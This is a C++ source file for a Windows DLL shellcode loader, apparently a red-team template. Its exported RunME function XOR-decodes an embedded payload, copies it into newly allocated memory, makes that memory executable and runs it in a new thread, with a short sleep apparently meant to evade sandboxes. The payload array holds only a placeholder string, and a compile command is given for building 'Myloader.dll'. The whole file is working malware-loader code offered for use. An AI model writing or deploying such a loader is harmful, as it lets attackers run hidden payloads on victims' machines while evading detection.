#include <windows.h>
#include <stdio.h>                                                                                  
#include <stdlib.h>
#include <string.h>

# compile: x86_64-w64-mingw32-g++ -shared result.cpp -o Myloader.dll

void XOR(char * data, size_t data_len, char * key, size_t key_len) {                                         
        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;

                data[i] = data[i] ^ key[j];
                j++;
        }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:                                                                                 
                   break;
    }
    return TRUE;
}

extern "C" {
        __declspec(dllexport) BOOL WINAPI RunME(void) {
                void * exec_mem;
                BOOL rv;
                HANDLE th;
                DWORD oldprotect = 0;

                unsigned char payload[] = "key:";                                                                    
                unsigned int pay_len = sizeof(payload);
                char key[] = "key:";
                exec_mem = VirtualAlloc(0, pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                Sleep(3000);
                XOR((char *) payload, pay_len, key, sizeof(key));
                RtlMoveMemory(exec_mem, payload, pay_len);
                rv = VirtualProtect(exec_mem, pay_len, PAGE_EXECUTE_READ, &oldprotect);
                if ( rv != 0 ) {
                        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                        WaitForSingleObject(th, -1);                                                               
                }

                return TRUE;
        }
}
